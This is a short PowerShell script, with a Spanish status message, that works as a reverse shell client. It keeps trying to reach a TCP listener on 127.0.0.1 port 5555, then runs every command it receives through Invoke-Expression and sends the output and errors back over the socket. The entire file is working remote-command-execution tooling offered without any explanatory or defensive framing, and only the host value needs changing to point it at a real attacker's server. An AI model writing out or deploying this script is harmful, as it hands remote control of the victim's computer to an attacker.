do {
$Socket = New-Object System.Net.Sockets.TcpClient("127.0.0.1",5555)  
Start-Sleep -s 3
} While ( !$Socket.Connected)
Write-Host "Conectado al servidor..."

$Stream = $Socket.GetStream()
$Reader = New-Object System.IO.StreamReader($Stream)
$Writer = New-Object System.IO.StreamWriter($Stream)
$Buffer = New-Object System.Byte[] 64

do {

	$RecvBytes = $Stream.Read($Buffer,0, $Buffer.Length)
	$RecvMsg = [System.Text.Encoding]::UTF8.GetString($Buffer,0,$RecvBytes)
	$Output = Invoke-Expression "$RecvMsg" | Out-String
	
	if ( $Error.Count -eq 1 ){ $Output += $Error}; $Error.Clear()

	$DataCount = $Output.Length 	

	if ( $RecvMsg -eq "exit" ) { break }
	
	$Writer.write("$DataCount") 
	$Writer.Flush()	
	
	$Stream.Read($Buffer,0,$Buffer.Length) 

	$Writer.write("$Output")
	$Writer.Flush()
} while ($True) 

$Reader.Close()
$Stream.Close()
$Socket.Close()